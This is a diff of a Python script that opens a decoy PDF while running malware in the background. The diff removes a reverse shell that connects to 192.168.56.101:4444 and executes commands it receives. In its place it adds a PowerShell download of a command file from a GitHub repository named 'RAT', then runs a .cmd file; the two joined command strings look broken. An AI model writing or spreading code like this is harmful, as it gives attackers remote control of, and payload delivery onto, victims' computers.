@@ -21,33 +21,14 @@ def open_pdf():
     webbrowser.open(pdf_path)
 
 
-def connect_back():
-    # Your existing reverse shell code here
-    s = socket.socket()
-    s.connect(("192.168.56.101", 4444))
-    while True:
-        try:
-            # Receive the command
-            cmd = s.recv(1024).decode("utf-8")
-            if cmd.lower() == "exit":
-                break
-
-            # Run the command and get output
-            output = subprocess.run(cmd, shell=True, capture_output=True)
-            result = output.stdout + output.stderr
-
-            # Send back the result
-            if result:
-                s.send(result)
-            else:
-                s.send(b"[+] Command executed but no output.\n")
-        except Exception as e:
-            error_message = f"[-] Error: {str(e)}\n".encode()
-            s.send(error_message)
-
-    s.close()
-
-
 # Start PDF and reverse shell
 threading.Thread(target=open_pdf).start()
-connect_back()
+command = [
+    "powershell.exe",
+    "-Command",
+    "Invoke-WebRequest -Uri https://raw.githubusercontent.com/lukeeeeeee335/RAT/main/init.cmd -OutFile init.cmd"
+    ".\\wget.cmd"
+]
+subprocess.run(command)
+
+## run our admin privlige function i.e. wget and init.cmd .\init.cmd
